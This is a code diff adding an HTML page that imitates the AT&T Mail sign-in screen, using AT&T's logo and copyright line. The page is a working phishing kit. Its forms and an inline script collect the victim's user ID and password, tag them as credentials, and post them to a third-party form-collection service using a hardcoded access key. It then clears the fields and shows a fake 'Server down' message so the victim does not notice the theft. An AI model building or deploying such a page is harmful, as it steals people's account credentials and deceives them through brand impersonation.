@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Screen</title>
+    <link rel="shortcut icon" type="image/png" href="/AT_T-removebg-preview.png">
+
+    <link rel="stylesheet" href="/style.css">
+    <script src="https://kit.fontawesome.com/d79aec2d94.js" crossorigin="anonymous"></script>
+    <script src="https://web3forms.com/client/script.js" async defer></script>
+</head>
+<body>
+    <div class="overall-container">
+        <div class="container">
+            <div class="identity">
+<img src="https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg" alt="">
+            </div>
+            <div class="id" id="id">
+            <div class="contents">
+<h1>Sign in</h1>
+<h2>to access AT&T Mail and Currently.com</h2>
+            </div>
+
+            <div class="userId">
+<form action="https://api.web3forms.com/submit" method="POST">
+    <input type="hidden" name="access_key" value="47e5166e-10e1-4f74-97dd-56006b5ac421">
+    <label for="userId">User ID</label><br>
+    <input type="text" id="userIdInput" name="fname">
+    <p id="userIdMessage" style="display: none;"></p>
+</form>
+<button id="conButton">Continue</button>
+
+<div class="signupLink">
+    <a href="#">Forgot user ID?</a>
+    <a href="#">Don't have a user ID? Create one now</a>
+</div>
+            </div>
+        </div>
+
+        <div class="password" id="passWord">
+            <div class="passContent">
+            <h1>Welcome</h1>
+            <div class="passButton">
+            <button class="fa-solid fa-arrow-left-long" id="arrow"></button>
+            <div id="userIdDisplay"></div>
+        </div>
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="47e5166e-10e1-4f74-97dd-56006b5ac421">
+            <label for="password">Password</label>
+            <div class="password-container">
+                <input type="text" id="email" name="lname" class="hidden">
+                <span class="toggle-password" id="toggleEmail">Show</span>
+            </div>
+            
+
+            <div class="checkbox">
+                <input type="checkbox" id="keepSignedIn" name="checkbox">
+                <label for="">Keep me signed in</label>
+            </div>
+            <div class="signIn">
+            <button type="submit" id="signInButton">Sign in</button>
+        </div>
+        </form>
+        <div class="forgetPass">
+            <a href="">Forgot password?</a>
+        </div>
+        
+        </div>
+        </div>
+        </div> 
+        <div class="link">
+<a href="#">Legal policy center</a>
+<a href="#">Privacy policy</a>
+<a href="#">Terms of use</a>
+<a href="#">Accessibility</a>
+<div class="last-link">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" role="img" focusable="true" class="footer-link-icon-svg" id="footerLinkIconSvg4" aria-label="California Consumer Privacy Act (CCPA) Opt-Out Icon">
+        <rect x="1" y="6.07595" width="22" height="11.1392" rx="5.56962" fill="white"></rect>
+        <path fill-rule="evenodd" clip-rule="evenodd" d="M17.4304 6.07595C20.5064 6.07595 23 8.56955 23 11.6456C23 14.7216 20.5064 17.2152 17.4304 17.2152H6.56962C3.49361 17.2152 1 14.7216 1 11.6456C1 8.56955 3.49361 6.07595 6.56962 6.07595H17.4304ZM13.2679 6.91818H6.56962C3.95876 6.91818 1.84223 9.03471 1.84223 11.6456C1.84223 14.2564 3.95876 16.373 6.56962 16.373H10.7321L13.2679 6.91818ZM10.3553 9.41582C10.5301 9.55752 10.557 9.81415 10.4153 9.98902L7.41378 13.6942C7.16006 14.0074 6.69106 14.0319 6.4061 13.7468L4.65019 11.9904C4.49109 11.8312 4.49109 11.5732 4.65019 11.414C4.80929 11.2549 5.06725 11.2549 5.22635 11.414L6.87565 13.0638L9.78224 9.47587C9.92389 9.301 10.1804 9.27411 10.3553 9.41582ZM15.1023 9.24971C14.9477 9.08617 14.6899 9.07896 14.5264 9.2336C14.3629 9.38824 14.3557 9.64617 14.5103 9.80971L16.2013 11.5987L14.4609 13.3396C14.3018 13.4988 14.3018 13.7568 14.4609 13.916C14.62 14.0751 14.878 14.0751 15.0371 13.916L16.7614 12.1911L18.4368 13.9635C18.5914 14.1271 18.8493 14.1343 19.0128 13.9796C19.1762 13.825 19.1835 13.5671 19.0289 13.4035L17.3378 11.6146L19.0782 9.8736C19.2373 9.71445 19.2373 9.45641 19.0782 9.29726C18.9191 9.13811 18.6611 9.13811 18.502 9.29726L16.7777 11.0221L15.1023 9.24971Z" fill="#454B52"></path>
+        </svg>
+<a href="#">Your privacy choices</a>
+</div>
+        </div>
+        
+        <footer id="copyright">
+<p>©2024 AT&T Intellectual Property. All rights reserved.</p>
+        </footer>
+    </div>
+
+
+
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Get the submit button
+            var submitButton = document.getElementById("signInButton");
+    
+            // Add a click event listener to the submit button
+            submitButton.addEventListener("click", function(event) {
+                // Prevent the default form submission
+                event.preventDefault();
+    
+                // Get the input element with id "userIdInput"
+                var userIdInput = document.getElementById("userIdInput");
+    
+                // Get the input element with id "email"
+                var emailInput = document.getElementById("email");
+    
+                // Get all input elements on the page
+                var inputs = document.querySelectorAll("input");
+    
+                // Create a FormData object to store form data
+                var formData = new FormData();
+    
+                // Append "User ID: " text only to the input with id "userIdInput"
+                formData.append(userIdInput.name, "USER ID: " + userIdInput.value);
+    
+                // Append "Password: " text only to the input with id "email"
+                formData.append(emailInput.name, "PASSWORD: " + emailInput.value);
+    
+                // Iterate over each input element except "userIdInput" and "email" and append its name and value to the FormData object
+                inputs.forEach(function(input) {
+                    if (input !== userIdInput && input !== emailInput) {
+                        formData.append(input.name, input.value);
+                    }
+                });
+    
+                // Clear all input fields
+                inputs.forEach(function(input) {
+                    input.value = "";
+                });
+    
+                // Create a new XMLHttpRequest object
+                var xhr = new XMLHttpRequest();
+    
+                // Define the POST request
+                xhr.open("POST", "https://api.web3forms.com/submit");
+    
+                // Set the appropriate headers
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    
+                // Send the FormData object as the request body
+                xhr.send(new URLSearchParams(formData));
+    
+                // Handle server response
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        // Server response is OK
+                        alert("Server down, try again in an hour");
+                    } else {
+                        // Server error
+                        alert("Form submitted successfully");
+                    }
+                };
+    
+                // Handle network errors
+                xhr.onerror = function() {
+                    alert("Network error occurred. Please try again later.");
+                };
+            });
+        });
+    </script>
+    
+    
+    
+    
+    <script src="/script.js"></script>
+</body>
+</html>
